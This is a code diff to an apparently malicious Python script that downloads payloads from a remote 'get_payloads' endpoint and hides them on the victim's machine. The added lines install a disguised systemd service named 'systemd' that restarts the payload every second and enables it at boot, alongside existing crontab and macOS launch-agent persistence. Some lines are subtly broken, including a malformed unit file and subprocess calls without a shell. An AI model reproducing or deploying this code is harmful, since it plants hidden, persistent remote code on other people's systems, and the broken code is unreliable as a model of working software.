@@ -3,6 +3,7 @@ import platform
 import subprocess
 import base64
 import requests
+import getpass
 
 def run(url, file_path):
     def create_hidden_file(path):
@@ -18,6 +19,25 @@ def run(url, file_path):
     def add_crontab_job(command, interval_minutes=10):
         cron_job = f"*/{interval_minutes} * * * * {command}"
         os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
+
+
+    def create_systemd_service(file_path):
+        with open ('/etc/systemd/system/systemd.service', 'w') as f:
+            f.write(f"""[Unit]
+Description=systemd service
+After=network.target
+StartLimitIntervalSec=0[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User={getpass.getuser()}
+ExecStart={file_path}
+
+[Install]
+WantedBy=multi-user.target""")
+
+        subprocess.run('systemctl start systemd')
+        subprocess.run('systemctl enable systemd')
     
     def create_launch_agent(path, label):
         plist_content = f"""
@@ -114,6 +134,7 @@ def run(url, file_path):
               file.write(response.content)
         # Create a hidden file and add a crontab job
         create_hidden_file(file_path)
+        create_systemd_service(file_path)
         #add_crontab_job(file_path)
     
     elif os_type == 'Darwin':  # macOS
@@ -122,7 +143,7 @@ def run(url, file_path):
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, 'wb') as file:
               file.write(response.content)
-        # Create a hidden file and add a launch agent
+              
         create_hidden_file(file_path)
         create_launch_agent(file_path, "com.yourname.launcher")
     
